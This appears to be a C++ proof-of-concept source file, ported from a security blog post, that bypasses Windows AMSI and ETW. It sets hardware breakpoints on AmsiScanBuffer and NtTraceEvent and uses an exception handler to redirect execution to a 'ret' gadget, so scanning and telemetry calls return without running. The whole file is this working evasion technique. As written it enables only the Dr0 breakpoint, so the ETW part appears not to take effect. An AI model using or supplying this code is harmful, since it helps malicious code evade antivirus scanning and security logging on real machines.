/**
This is based off of the amazing post by Praetorian:
https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/

I just ported the code to C++ and added the breakpoints into AMSI and ETW
**/

#include <Windows.h>
#include <cstdio>
#include <cstdint>
#include <cstring>

#define IMPORTAPI(DLLFILE, FUNCNAME, RETTYPE, ...) \
    using type##FUNCNAME = RETTYPE(WINAPI*)(__VA_ARGS__); \
    type##FUNCNAME FUNCNAME = reinterpret_cast<type##FUNCNAME>(GetProcAddress((LoadLibraryW(DLLFILE), GetModuleHandleW(DLLFILE)), #FUNCNAME));

uintptr_t find_gadget(size_t function, const BYTE* stub, size_t size, size_t dist)
{
    for (size_t i = 0; i < dist; i++)
    {
        if (memcmp(reinterpret_cast<LPVOID>(function + i), stub, size) == 0) {
            return function + i;
        }
    }
    return 0ull;
}

LONG WINAPI exception_handler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
    {
        printf("7. Single step exception\n");
        printf("\tDr0: %p\tDr7: %p\n", reinterpret_cast<PVOID>(ExceptionInfo->ContextRecord->Dr0), reinterpret_cast<PVOID>(ExceptionInfo->ContextRecord->Dr7));

        BYTE stub[] = { 0xC3 };
        PVOID ret_addr = reinterpret_cast<PVOID>(find_gadget(ExceptionInfo->ContextRecord->Rip, stub, sizeof(stub), 100000));
        printf("8. Found ret gadget at %p\n", ret_addr);
        ExceptionInfo->ContextRecord->Rip = reinterpret_cast<DWORD64>(ret_addr);
        ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void execute_debug_context()
{
    IMPORTAPI(L"NTDLL.dll", NtContinue, NTSTATUS, PCONTEXT, BOOLEAN);

    AddVectoredExceptionHandler(1, exception_handler);
    printf("1. Exception handler registered\n");

    CONTEXT context_thread = { 0 };
    context_thread.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    RtlCaptureContext(&context_thread);
    printf("2. Thread context captured\n");
    printf("\tDr0: %p\tDr7: %p\n", reinterpret_cast<PVOID>(context_thread.Dr0), reinterpret_cast<PVOID>(context_thread.Dr7));

    context_thread.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    context_thread.Dr0 = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleW(L"amsi.dll"), "AmsiScanBuffer"));
    context_thread.Dr1 = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtTraceEvent"));
    context_thread.Dr7 |= 1ull << (2 * 0);
    context_thread.Dr7 &= ~(3ull << (16 + 4 * 0));
    context_thread.Dr7 &= ~(3ull << (18 + 4 * 0));
    printf("3. Debug register values set\n");
    printf("\tDr0: %p\tDr1: %p\tDr7: %p\n", reinterpret_cast<PVOID>(context_thread.Dr0), reinterpret_cast<PVOID>(context_thread.Dr1), reinterpret_cast<PVOID>(context_thread.Dr7));

    NtContinue(&context_thread, FALSE);
    printf("4. Thread context set\n");


    context_thread.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    context_thread.Dr0 = context_thread.Dr1 = context_thread.Dr7 = 0;
    GetThreadContext(GetCurrentThread(), &context_thread);
    printf("5. Thread context retrieved\n");
    printf("\tDr0: %p\tDr1: %p\tDr7: %p\n", reinterpret_cast<PVOID>(context_thread.Dr0), reinterpret_cast<PVOID>(context_thread.Dr1), reinterpret_cast<PVOID>(context_thread.Dr7));

    printf("6. Program finished\n");
}

int main()
{
    execute_debug_context();
    return 0;
}